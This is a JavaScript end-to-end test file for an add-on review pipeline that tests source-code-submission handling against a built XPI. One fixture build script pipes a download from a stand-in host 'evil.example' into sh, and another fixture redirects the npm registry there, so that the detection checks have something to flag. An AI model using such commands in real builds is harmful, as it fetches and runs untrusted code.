// End-to-end test for SCS mode (source-code submission): the positional XPI is the
// SHIPPED artifact (manifest + reachability + WAR + bundled-files resolve against
// it), while the readable --scs-source tree is the review target the code checks
// analyze. The built layout deliberately differs from the source layout - the XPI's
// entry scripts are named differently than the source's - which is the case that
// stresses the shipped/review-target split.

import { test, mock } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { runPipeline } from "../../src/pipeline.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const SCHEMA_FIXTURE = path.join(here, "..", "schema-fixture");

function tmpDir(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-scs-"));
  for (const [name, content] of Object.entries(files)) {
    const dest = path.join(dir, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return dir;
}

// The SHIPPED XPI: built entry scripts (background.js / content.js) that load a
// web-accessible resource. This is a self-consistent built add-on.
const XPI_FILES = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "SCS E2E",
    version: "1.0",
    background: { scripts: ["background.js"] },
    content_scripts: [{ matches: ["*://*/*"], js: ["content.js"] }],
    web_accessible_resources: [
      { resources: ["injected.js"], matches: ["*://*/*"] },
    ],
  }),
  "background.js": `console.log("built bg");`,
  "content.js": `const u=browser.runtime.getURL("injected.js");const s=document.createElement("script");s.src=u;document.head.append(s);`,
  "injected.js": `console.log("built injected");`,
};

// The readable SOURCE: a different pre-build layout (entry file named main.js, not
// the manifest's background.js), carrying a real WebExtension API defect.
const SRC_FILES = {
  "package.json": JSON.stringify({ name: "scs-e2e", version: "1.0.0" }),
  "src/main.js": `browser.totallyFakeNamespace.doThing();\n`,
  "src/content.js": `browser.runtime.getURL("injected.js");\n`,
  "src/injected.js": `console.log("source injected");\n`,
};

const has = (findings, ruleId, pred = () => true) =>
  findings.some((f) => f.ruleId === ruleId && pred(f));

// --scs-source must be a subfolder of --scs-root, not the root itself: an add-on
// source that IS the whole submission has no source/build separation (and no build
// files). runPipeline throws before loading anything, for both "." and the root path.
test("SCS: runPipeline throws when --scs-source resolves to --scs-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  for (const scsSource of [".", src]) {
    await assert.rejects(
      () => runPipeline({ addonPath: xpi, scsRoot: src, scsSource }),
      /--scs-source must be a subfolder of --scs-root/
    );
  }
});

// Regression: the --scs-root tree is read ONCE and the archive is shared by the review
// loader (loadScsAddon) and the build-corpus loader (loadScsBuildFiles), so it is not
// walked (nor its symlinks warned) twice. Before the dedupe each loader called
// loadAddon(scsRoot), reading the root twice.
test("SCS: the --scs-root archive is read once, not twice", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const realReaddir = fs.readdirSync;
  let rootReads = 0;
  mock.method(fs, "readdirSync", (p, ...rest) => {
    if (path.resolve(p) === path.resolve(src)) {
      rootReads += 1;
    }
    return realReaddir(p, ...rest);
  });
  try {
    await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.equal(rootReads, 1, "--scs-root walked once, not twice");
  } finally {
    mock.restoreAll();
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCS e2e: code checks review the source; manifest/WAR resolve against the XPI", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    const { findings } = result;

    // (1) Code checks review ALL the source: a fake API in main.js - a file the
    // XPI manifest never names (so it is unreachable from the built entry points) -
    // is still caught, because the SCS code checks review every source file.
    assert.ok(
      has(
        findings,
        "unknown-api",
        (f) => f.file === "main.js" && /totallyFakeNamespace/.test(f.item)
      ),
      "expected unknown-api on the non-entry source file main.js"
    );

    // (2) bundled-files resolves manifest refs against the XPI: background.js is a
    // built entry present in the XPI but absent from the source tree, so it must
    // NOT be reported as "not bundled".
    assert.ok(
      !has(findings, "bundled-files", (f) => /background\.js/.test(f.item)),
      "background.js (a built entry) must not be flagged as unbundled"
    );

    // (3) minimize-WAR / reachability judged over the XPI: injected.js is loaded by
    // the XPI's own content script, so the exposure is needed - no false finding.
    assert.ok(
      !has(findings, "minimize-web-accessible-resources"),
      "injected.js is loaded by the shipped content script - no WAR finding"
    );

    assert.equal(result.meta.reviewed, true);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCS e2e: --scs-exp-source excludes the Experiment subtree from the code checks", async () => {
  const xpi = tmpDir(XPI_FILES);
  // Source carries a privileged Experiment file (ChromeUtils) under experiments/.
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    };
    // Without the flag, the privileged Experiment code is reviewed as WebExtension
    // code and false-positives core-symbol-in-webext.
    const without = await runPipeline(base);
    assert.ok(
      has(
        without.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "without --scs-exp-source the experiment file is (falsely) flagged"
    );

    // With the flag - relative to --scs-root, like --scs-source (so "src/experiments",
    // NOT "experiments") - the experiment subtree is excluded, no false positive, while
    // the real defect in main.js is still caught.
    const withExp = await runPipeline({
      ...base,
      scsExpSource: "src/experiments",
    });
    assert.ok(
      !has(
        withExp.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "with --scs-exp-source the experiment subtree is excluded"
    );
    assert.ok(
      has(withExp.findings, "unknown-api", (f) => f.file === "main.js"),
      "the WebExtension code is still reviewed with --scs-exp-source"
    );

    // Both source flags also accept an absolute path (same --scs-root base).
    const withAbs = await runPipeline({
      ...base,
      scsExpSource: path.join(src, "src", "experiments"),
    });
    assert.ok(
      !has(
        withAbs.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "an absolute --scs-exp-source is accepted and excludes the subtree"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCS e2e: unused-files flags the build's dead files, not source scaffolding", async () => {
  // The XPI ships a file no entry point reaches; the source repo has its own
  // unreferenced scaffolding that never ships.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("dead weight in the build");`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/leftover-config.js": `console.log("unreferenced source scaffolding");`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    // unused-files describes the SHIPPED artifact: the XPI's dead file is flagged...
    assert.ok(
      has(findings, "unused-files", (f) => f.file === "orphan.js"),
      "expected the XPI's dead file to be flagged"
    );
    // ...but the source repo's unreferenced scaffolding never ships, so it is not.
    assert.ok(
      !findings.some((f) => f.file === "leftover-config.js"),
      "source-repo scaffolding must not be flagged in SCS"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCS e2e: --diff-to diffs the built XPI against the baseline XPI, not the source", async () => {
  // The baseline XPI and the new (positional) XPI differ ONLY in strict_max_version.
  const manifest = (smax) =>
    JSON.stringify({
      manifest_version: 3,
      name: "SCS Diff",
      version: "1.0",
      background: { scripts: ["background.js"] },
      browser_specific_settings: {
        gecko: { id: "diff@scs", strict_max_version: smax },
      },
    });
  const oldXpi = tmpDir({
    "manifest.json": manifest("100.0"),
    "background.js": `console.log("v1");`,
  });
  const newXpi = tmpDir({
    "manifest.json": manifest("110.0"),
    "background.js": `console.log("v1");`,
  });
  // The readable source is a different layout - the diff must ignore it entirely.
  const src = tmpDir(SRC_FILES);
  try {
    const { findings } = await runPipeline({
      addonPath: newXpi,
      scsRoot: src,
      scsSource: "src",
      diffTo: oldXpi,
      schemaZip: SCHEMA_FIXTURE,
    });
    // Only strict_max_version moved between the two XPIs, so the bump-only diff
    // fires - proving --diff-to compared the built XPIs, not the source tree (whose
    // files share nothing byte-identical with the XPI and would suppress it).
    assert.ok(
      has(findings, "strict-max-version-bump-only"),
      "expected the version-bump diff to fire against the XPI baseline in SCS"
    );
  } finally {
    [oldXpi, newXpi, src].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCS e2e: locale checks evaluate _locales against the XPI, not the source", async () => {
  // The XPI ships _locales/en (as a build would); the readable source tree does
  // not (generated, or kept outside --scs-source).
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    // The shipped XPI satisfies default_locale, so there is no false reject - even
    // though the source has no _locales directory.
    assert.ok(
      !has(findings, "default-locale-unused"),
      "default_locale must be checked against the XPI's _locales, not the source"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCS e2e: missing-english-localization checks the XPI's _locales, not source text", async () => {
  // The shipped XPI ships an English locale; the source has no _locales and its
  // visible text is German. The check must see the XPI's English locale and pass,
  // not language-detect the source text and falsely flag a non-English add-on.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/popup.html": `<html><body><h1>Willkommen bei unserer Erweiterung</h1><p>Diese Anwendung verwaltet Ihre Nachrichten und Einstellungen sorgfaeltig und zuverlaessig.</p></body></html>`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      !has(findings, "missing-english-localization"),
      "the XPI's English _locales must satisfy the check, not the German source text"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCS e2e: background-module judges the XPI's background script, not the ESM source", async () => {
  const manifest = JSON.stringify({
    manifest_version: 3,
    name: "B",
    version: "1.0",
    background: { scripts: ["background.js"] }, // no type: module
  });
  // (a) The source uses ESM, but the build bundles it to a CLASSIC shipped script,
  // so the manifest correctly omits type:module. Reading the source would
  // false-positive; reading the shipped classic script does not.
  const xpiClassic = tmpDir({
    "manifest.json": manifest,
    "background.js": `(function () { console.log("bundled classic"); })();`,
  });
  const srcEsm = tmpDir({
    "package.json": "{}",
    "src/background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "src/util.js": `export const x = 1;`,
  });
  // (b) The shipped script genuinely IS ESM (e.g. a rollup --format es bundle) with
  // no type:module - a real loading defect the check must still catch over the XPI.
  const xpiEsm = tmpDir({
    "manifest.json": manifest,
    "background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "util.js": `export const x = 1;`,
  });
  try {
    const a = await runPipeline({
      addonPath: xpiClassic,
      scsRoot: srcEsm,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      !has(a.findings, "background-module"),
      "an ESM source bundled to a classic shipped script must not false-positive"
    );
    const b = await runPipeline({
      addonPath: xpiEsm,
      scsRoot: srcEsm,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      has(b.findings, "background-module"),
      "a genuinely-ESM shipped background script with no type:module is still caught"
    );
  } finally {
    [xpiClassic, srcEsm, xpiEsm].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCS e2e: trademark-violation resolves a localized name via the XPI's _locales", async () => {
  // The displayed name is a __MSG_ placeholder resolved from the XPI's _locales to
  // a trademark-violating string; the source has no _locales. The check must
  // resolve against the shipped XPI, not silently miss it over the source.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "__MSG_extName__",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"extName":{"message":"Firefox Helper"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      has(findings, "trademark-violation"),
      "a localized trademark-violating name must be caught via the XPI's _locales"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A vulnerable devDependency is a real risk in SCS because the reviewer builds the
// add-on from source. The dedicated vendor-vulnerable-dev check (scs:true) runs
// only here - it OSV-audits the root package.json's devDependencies and surfaces
// the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
test("SCS e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "scs-e2e",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
  });
  // Injected OSV transport: one HIGH advisory for the dev dep, fixed in 2.0.0.
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async () => ({}),
    postJson: async (_url, body) =>
      body?.package?.name === "build-tool"
        ? {
            vulns: [
              {
                id: "GHSA-dev0-0000-0000",
                aliases: ["CVE-2021-0001"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "build-tool" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
      vendorNet,
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "expected vendor-vulnerable-dev on the vulnerable devDependency"
    );
    // The prod/shipped vulnerability check is a separate set - a dev-only dep must
    // not trip it.
    assert.ok(
      !has(findings, "vendor-vulnerable"),
      "vendor-vulnerable (prod set) must not fire for a dev-only dependency"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The build files (everything in --scs-root outside --scs-source) are reviewed by
// undeclared-build-source (SCS-only LLM check). This proves the pipeline wires
// loadScsBuildFiles -> addon.buildFiles -> buildCtx (ctx.addon) -> the check: with NO
// LLM token every candidate escalates to Extended manual review (graceful offline
// degradation).
test("SCS e2e: a build script outside the source is reviewed by undeclared-build-source", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
  });
  try {
    const { meta } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    // The check ran (SCS-eligible)...
    assert.ok(
      meta.checksRun.includes("undeclared-build-source"),
      "undeclared-build-source runs in SCS mode"
    );
    // ...and with no token the whole-build review escalated to Extended manual
    // review (anchored at package.json; the review source's files under src/ are
    // never part of the build corpus).
    assert.ok(
      meta.manualReview.some(
        (m) => m.extended && m.title === "Build process review"
      ),
      "the build review surfaces for manual review offline"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The deterministic build-policy checks run offline over the build files (outside the
// review source): a yarn.lock is an Unsupported build tool reject, and an .npmrc
// registry redirect is a Build registry override reject.
test("SCS e2e: build-policy checks flag yarn + a redirected registry offline", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "yarn.lock": "# yarn lockfile v1\n",
    ".npmrc": "registry=https://evil.example/\n",
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      has(findings, "unsupported-build-tool", (f) => /yarn/.test(f.message)),
      "yarn.lock is rejected as an unsupported build tool"
    );
    assert.ok(
      has(findings, "build-registry-redirect", (f) =>
        /evil\.example/.test(f.message)
      ),
      "the .npmrc registry redirect is rejected"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A clean npm build (package-lock.json + the public registry) fires neither.
test("SCS e2e: a clean npm build fires neither build-policy check", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package-lock.json": "{}",
    ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(!has(findings, "unsupported-build-tool"));
    assert.ok(!has(findings, "build-registry-redirect"));
    assert.ok(!has(findings, "committed-node-modules"));
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed node_modules folder in --scs-root is a hard fail; its contents are never
// read (loadAddon skips it, recording only the directory).
test("SCS e2e: a committed node_modules folder is rejected", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "node_modules/left-pad/index.js": "module.exports = 1;\n",
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scsRoot: src,
      scsSource: "src",
      schemaZip: SCHEMA_FIXTURE,
    });
    assert.ok(
      has(findings, "committed-node-modules", (f) =>
        /node_modules/.test(f.message)
      ),
      "a committed node_modules folder is flagged"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});
